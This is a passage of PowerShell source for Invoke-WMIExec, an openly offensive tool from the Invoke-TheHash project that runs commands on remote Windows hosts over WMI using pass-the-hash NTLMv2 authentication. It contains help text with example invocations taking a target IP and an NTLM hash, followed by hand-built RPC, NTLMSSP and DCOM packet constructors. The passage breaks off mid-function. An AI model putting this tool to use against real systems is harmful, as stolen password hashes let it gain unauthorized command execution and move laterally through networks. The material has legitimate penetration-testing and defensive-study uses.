function Invoke-WMIExec
{
<#
.SYNOPSIS
Invoke-WMIExec performs WMI command execution on targets using NTLMv2 pass the hash authentication.

Author: Kevin Robertson (@kevin_robertson)  
License: BSD 3-Clause 

.PARAMETER Target
Hostname or IP address of target.

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after
the username. 

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER Command
Command to execute on the target. If a command is not specified, the function will just check to see if the
username and hash has access to WMI on the target.

.PARAMETER Sleep
Default = 10 Milliseconds: Sets the function's Start-Sleep values in milliseconds. You can try tweaking this
setting if you are experiencing strange results.

.EXAMPLE
Execute a command.
Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose

.EXAMPLE
Check command execution privilege.
Invoke-WMIExec -Target 192.168.100.20 -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0

.LINK
https://github.com/Kevin-Robertson/Invoke-TheHash

#>
[CmdletBinding()]
param
(
    [parameter(Mandatory=$true)][String]$Target,
    [parameter(Mandatory=$true)][String]$Username,
    [parameter(Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][String]$Command,
    [parameter(Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][Int]$Sleep=10
)

if($Command)
{
    $WMI_execute = $true
}

function ConvertFrom-PacketOrderedDictionary
{
    param($packet_ordered_dictionary)

    ForEach($field in $packet_ordered_dictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#RPC

function New-PacketRPCBind
{
    param([Int]$packet_call_ID,[Byte[]]$packet_max_frag,[Byte[]]$packet_num_ctx_items,[Byte[]]$packet_context_ID,[Byte[]]$packet_UUID,[Byte[]]$packet_UUID_version)

    [Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)

    $packet_RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCBind.Add("Version",[Byte[]](0x05))
    $packet_RPCBind.Add("VersionMinor",[Byte[]](0x00))
    $packet_RPCBind.Add("PacketType",[Byte[]](0x0b))
    $packet_RPCBind.Add("PacketFlags",[Byte[]](0x03))
    $packet_RPCBind.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCBind.Add("FragLength",[Byte[]](0x48,0x00))
    $packet_RPCBind.Add("AuthLength",[Byte[]](0x00,0x00))
    $packet_RPCBind.Add("CallID",$packet_call_ID_bytes)
    $packet_RPCBind.Add("MaxXmitFrag",[Byte[]](0xb8,0x10))
    $packet_RPCBind.Add("MaxRecvFrag",[Byte[]](0xb8,0x10))
    $packet_RPCBind.Add("AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_RPCBind.Add("NumCtxItems",$packet_num_ctx_items)
    $packet_RPCBind.Add("Unknown",[Byte[]](0x00,0x00,0x00))
    $packet_RPCBind.Add("ContextID",$packet_context_ID)
    $packet_RPCBind.Add("NumTransItems",[Byte[]](0x01))
    $packet_RPCBind.Add("Unknown2",[Byte[]](0x00))
    $packet_RPCBind.Add("Interface",$packet_UUID)
    $packet_RPCBind.Add("InterfaceVer",$packet_UUID_version)
    $packet_RPCBind.Add("InterfaceVerMinor",[Byte[]](0x00,0x00))
    $packet_RPCBind.Add("TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $packet_RPCBind.Add("TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    if($packet_num_ctx_items[0] -eq 2)
    {
        $packet_RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $packet_RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $packet_RPCBind.Add("Unknown3",[Byte[]](0x00))
        $packet_RPCBind.Add("Interface2",[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
        $packet_RPCBind.Add("InterfaceVer2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
    }
    elseif($packet_num_ctx_items[0] -eq 3)
    {
        $packet_RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $packet_RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $packet_RPCBind.Add("Unknown3",[Byte[]](0x00))
        $packet_RPCBind.Add("Interface2",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
        $packet_RPCBind.Add("InterfaceVer2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
        $packet_RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("ContextID3",[Byte[]](0x02,0x00))
        $packet_RPCBind.Add("NumTransItems3",[Byte[]](0x01))
        $packet_RPCBind.Add("Unknown4",[Byte[]](0x00))
        $packet_RPCBind.Add("Interface3",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
        $packet_RPCBind.Add("InterfaceVer3",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("InterfaceVerMinor3",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("AuthType",[Byte[]](0x0a))
        $packet_RPCBind.Add("AuthLevel",[Byte[]](0x04))
        $packet_RPCBind.Add("AuthPadLength",[Byte[]](0x00))
        $packet_RPCBind.Add("AuthReserved",[Byte[]](0x00))
        $packet_RPCBind.Add("ContextID4",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
        $packet_RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    if($packet_call_ID -eq 3)
    {
        $packet_RPCBind.Add("AuthType",[Byte[]](0x0a))
        $packet_RPCBind.Add("AuthLevel",[Byte[]](0x02))
        $packet_RPCBind.Add("AuthPadLength",[Byte[]](0x00))
        $packet_RPCBind.Add("AuthReserved",[Byte[]](0x00))
        $packet_RPCBind.Add("ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
        $packet_RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    return $packet_RPCBind
}

function New-PacketRPCAUTH3
{
    param([Byte[]]$packet_NTLMSSP)

    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLMSSP.Length)[0,1]
    [Byte[]]$packet_RPC_length = [System.BitConverter]::GetBytes($packet_NTLMSSP.Length + 28)[0,1]

    $packet_RPCAuth3 = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCAuth3.Add("Version",[Byte[]](0x05))
    $packet_RPCAuth3.Add("VersionMinor",[Byte[]](0x00))
    $packet_RPCAuth3.Add("PacketType",[Byte[]](0x10))
    $packet_RPCAuth3.Add("PacketFlags",[Byte[]](0x03))
    $packet_RPCAuth3.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCAuth3.Add("FragLength",$packet_RPC_length)
    $packet_RPCAuth3.Add("AuthLength",$packet_NTLMSSP_length)
    $packet_RPCAuth3.Add("CallID",[Byte[]](0x03,0x00,0x00,0x00))
    $packet_RPCAuth3.Add("MaxXmitFrag",[Byte[]](0xd0,0x16))
    $packet_RPCAuth3.Add("MaxRecvFrag",[Byte[]](0xd0,0x16))
    $packet_RPCAuth3.Add("AuthType",[Byte[]](0x0a))
    $packet_RPCAuth3.Add("AuthLevel",[Byte[]](0x02))
    $packet_RPCAuth3.Add("AuthPadLength",[Byte[]](0x00))
    $packet_RPCAuth3.Add("AuthReserved",[Byte[]](0x00))
    $packet_RPCAuth3.Add("ContextID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_RPCAuth3.Add("NTLMSSP",$packet_NTLMSSP)

    return $packet_RPCAuth3
}

function New-PacketRPCRequest
{
    param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_data)

    if($packet_auth_length -gt 0)
    {
        $packet_full_auth_length = $packet_auth_length + $packet_auth_padding + 8
    }

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_data.Length)
    [Byte[]]$packet_frag_length = $packet_write_length[0,1]
    [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length + $packet_data.Length)
    [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)[0,1]

    $packet_RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCRequest.Add("Version",[Byte[]](0x05))
    $packet_RPCRequest.Add("VersionMinor",[Byte[]](0x00))
    $packet_RPCRequest.Add("PacketType",[Byte[]](0x00))
    $packet_RPCRequest.Add("PacketFlags",$packet_flags)
    $packet_RPCRequest.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCRequest.Add("FragLength",$packet_frag_length)
    $packet_RPCRequest.Add("AuthLength",$packet_auth_length)
    $packet_RPCRequest.Add("CallID",$packet_call_ID)
    $packet_RPCRequest.Add("AllocHint",$packet_alloc_hint)
    $packet_RPCRequest.Add("ContextID",$packet_context_ID)
    $packet_RPCRequest.Add("Opnum",$packet_opnum)

    if($packet_data.Length)
    {
        $packet_RPCRequest.Add("Data",$packet_data)
    }

    return $packet_RPCRequest
}

function New-PacketRPCAlterContext
{
    param([Byte[]]$packet_assoc_group,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_interface_UUID)

    $packet_RPCAlterContext = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCAlterContext.Add("Version",[Byte[]](0x05))
    $packet_RPCAlterContext.Add("VersionMinor",[Byte[]](0x00))
    $packet_RPCAlterContext.Add("PacketType",[Byte[]](0x0e))
    $packet_RPCAlterContext.Add("PacketFlags",[Byte[]](0x03))
    $packet_RPCAlterContext.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCAlterContext.Add("FragLength",[Byte[]](0x48,0x00))
    $packet_RPCAlterContext.Add("AuthLength",[Byte[]](0x00,0x00))
    $packet_RPCAlterContext.Add("CallID",$packet_call_ID)
    $packet_RPCAlterContext.Add("MaxXmitFrag",[Byte[]](0xd0,0x16))
    $packet_RPCAlterContext.Add("MaxRecvFrag",[Byte[]](0xd0,0x16))
    $packet_RPCAlterContext.Add("AssocGroup",$packet_assoc_group)
    $packet_RPCAlterContext.Add("NumCtxItems",[Byte[]](0x01))
    $packet_RPCAlterContext.Add("Unknown",[Byte[]](0x00,0x00,0x00))
    $packet_RPCAlterContext.Add("ContextID",$packet_context_ID)
    $packet_RPCAlterContext.Add("NumTransItems",[Byte[]](0x01))
    $packet_RPCAlterContext.Add("Unknown2",[Byte[]](0x00))
    $packet_RPCAlterContext.Add("Interface",$packet_interface_UUID)
    $packet_RPCAlterContext.Add("InterfaceVer",[Byte[]](0x00,0x00))
    $packet_RPCAlterContext.Add("InterfaceVerMinor",[Byte[]](0x00,0x00))
    $packet_RPCAlterContext.Add("TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $packet_RPCAlterContext.Add("TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    return $packet_RPCAlterContext
}

function New-PacketNTLMSSPVerifier
{
    param([Int]$packet_auth_padding,[Byte[]]$packet_auth_level,[Byte[]]$packet_sequence_number)

    $packet_NTLMSSPVerifier = New-Object System.Collections.Specialized.OrderedDictionary

    if($packet_auth_padding -eq 4)
    {
        $packet_NTLMSSPVerifier.Add("AuthPadding",[Byte[]](0x00,0x00,0x00,0x00))
        [Byte[]]$packet_auth_pad_length = 0x04
    }
    elseif($packet_auth_padding -eq 8)
    {
        $packet_NTLMSSPVerifier.Add("AuthPadding",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        [Byte[]]$packet_auth_pad_length = 0x08
    }
    elseif($packet_auth_padding -eq 12)
    {
        $packet_NTLMSSPVerifier.Add("AuthPadding",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        [Byte[]]$packet_auth_pad_length = 0x0c
    }
    else
    {
        [Byte[]]$packet_auth_pad_length = 0x00
    }

    $packet_NTLMSSPVerifier.Add("AuthType",[Byte[]](0x0a))
    $packet_NTLMSSPVerifier.Add("AuthLevel",$packet_auth_level)
    $packet_NTLMSSPVerifier.Add("AuthPadLen",$packet_auth_pad_length)
    $packet_NTLMSSPVerifier.Add("AuthReserved",[Byte[]](0x00))
    $packet_NTLMSSPVerifier.Add("AuthContextID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifierVersionNumber",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifierChecksum",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifierSequenceNumber",$packet_sequence_number)

    return $packet_NTLMSSPVerifier
}

function New-PacketDCOMRemQueryInterface
{
    param([Byte[]]$packet_causality_ID,[Byte[]]$packet_IPID,[Byte[]]$packet_IID)

    $packet_DCOMRemQueryInterface = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_DCOMRemQueryInterface.Add("VersionMajor",[Byte[]](0x05,0x00))
    $packet_DCOMRemQueryInterface.Add("VersionMinor",[Byte[]](0x07,0x00))
    $packet_DCOMRemQueryInterface.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("CausalityID",$packet_causality_ID)
    $packet_DCOMRemQueryInterface.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("IPID",$packet_IPID)
    $packet_DCOMRemQueryInterface.Add("Refs",[Byte[]](0x05,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("IIDs",[Byte[]](0x01,0x00))
    $packet_DCOMRemQueryInterface.Add("Unknown",[Byte[]](0x00,0x00,0x01,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("IID",$packet_IID)

    return $packet_DCOMRemQueryInterface
}

function New-PacketDCOMRemRelease
{
    param([Byte[]]$packet_causality_ID,[Byte[]]$packet_IPID,[Byte[]]$packet_IPID2)

    $packet_DCOMRemRelease = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_DCOMRemRelease.Add("VersionMajor",[Byte[]](0x05,0x00))
    $packet_DCOMRemRelease.Add("VersionMinor",[Byte[]](0x07,0x00))
    $packet_DCOMRemRelease.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("CausalityID",$packet_causality_ID)
    $packet_DCOMRemRelease.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("Unknown",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("InterfaceRefs",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("IPID",$packet_IPID)
    $packet_DCOMRemRelease.Add("PublicRefs",[Byte[]](0x05,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("PrivateRefs",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("IPID2",$packet_IPID2)
    $packet_DCOMRemRelease.Add("PublicRefs2",[Byte[]](0x05,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("PrivateRefs2",[Byte[]](0x00,0x00,0x00,0x00))

    return $packet_DCOMRemRelease
}

function New-PacketDCOMRemoteCreateInstance
{
    param([Byte[]]$packet_causality_ID,[String]$packet_target)

    [Byte[]]$packet_target_unicode = [System.Text.Encoding]::Unicode.GetBytes($packet_target)
    [Byte[]]$packet_target_length = [System.BitConverter]::GetBytes($packet_target.Length + 1)
    $packet_target_unicode += ,0x00 * (([Math]::Truncate($packet_target_unicode.Length / 8 + 1) * 8) - $packet_target_unicode.Length)
    [Byte[]]$packet_cntdata = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 720)
    [Byte[]]$packet_size = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 680)
    [Byte[]]$packet_total_size = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 664)
    [Byte[]]$packet_private_header = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 40) + 0x00,0x00,0x00,0x00
    [Byte[]]$packet_property_data_size = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 56)

    $packet_DCOMRemoteCreateInstance = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_DCOMRemoteCreateInstance.Add("DCOMVersionMajor",[Byte[]](0x05,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMVersionMinor",[Byte[]](0x07,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMFlags",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMCausalityID",$packet_causality_ID)
    $packet_DCOMRemoteCreateInstance.Add("Unknown",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("Unknown2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("Unknown3",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("Unknown4",$packet_cntdata)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCntData",$packet_cntdata)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesOBJREFSignature",[Byte[]](0x4d,0x45,0x4f,0x57))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesOBJREFFlags",[Byte[]](0x04,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesOBJREFIID",[Byte[]](0xa2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFCLSID",[Byte[]](0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFCBExtension",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFSize",$packet_size)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesTotalSize",$packet_total_size)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderPrivateHeader",[Byte[]](0xb0,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderTotalSize",$packet_total_size)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCustomHeaderSize",[Byte[]](0xc0,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesDestinationContext",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesNumActivationPropertyStructs",[Byte[]](0x06,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsInfoClsid",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesNULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrMaxCount",[Byte[]](0x06,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid",[Byte[]](0xb9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid2",[Byte[]](0xab,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid3",[Byte[]](0xa5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid4",[Byte[]](0xa6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid5",[Byte[]](0xa4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid6",[Byte[]](0xaa,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrMaxCount",[Byte[]](0x06,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize",[Byte[]](0x68,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize2",[Byte[]](0x58,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize3",[Byte[]](0x90,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize4",$packet_property_data_size)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize5",[Byte[]](0x20,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize6",[Byte[]](0x30,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPrivateHeader",[Byte[]](0x58,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesSessionID",[Byte[]](0xff,0xff,0xff,0xff))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesRemoteThisSessionID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesClientImpersonating",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionIDPresent",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesDefaultAuthnLevel",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionGuid",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesProcessRequestFlags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesOriginalClassContext",[Byte[]](0x14,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesFlags",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesReserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
